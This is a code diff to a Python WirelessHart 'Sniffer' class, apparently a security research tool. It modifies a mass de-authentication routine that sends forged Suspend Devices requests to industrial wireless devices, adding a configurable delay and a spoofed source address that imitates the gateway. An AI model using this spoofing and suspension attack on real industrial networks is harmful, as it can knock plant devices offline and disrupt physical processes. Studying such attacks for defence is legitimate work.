@@ -236,7 +236,7 @@ class Sniffer(WirelessHart, EventsManager):
     def print_decryptor(self):
         print(self.__decryptor)
         
-    def mass_de_authetication_packet(self, dst, duration):
+    def mass_de_authetication_packet(self, dst, duration, wait_beofre_suspend:int=1000, src:int=0x1):
         """
         Sends a WirelessHart_Suspend_Devices_Request on the next slot in the next superframe"""
         
@@ -251,8 +251,8 @@ class Sniffer(WirelessHart, EventsManager):
         
         #planify the asn to send : next broadcast link receive in the next superframe
         asn_to_send = (((self.__asn + 200) // sf.nb_slots) + 1) * sf.nb_slots + link.join_slot
-        # start the suspend after 10s = 1000 slots of 10ms
-        asn_suspend = asn_to_send + 1000
+        # start the suspend after N slots in order to broadcast (every slot is 10ms)
+        asn_suspend = asn_to_send + wait_beofre_suspend
         #resume after the specified duration
         asn_resume = asn_suspend + duration
         
@@ -333,7 +333,7 @@ class Sniffer(WirelessHart, EventsManager):
             dot15d4_data = Dot15d4Data(
                 dest_panid = self.__panid,
                 dest_addr = dst,
-                src_addr = 0x1
+                src_addr = src #spoof the gatway
             )
             dot15d4_fcs = Dot15d4FCS(
                 fcf_panidcompress = True,
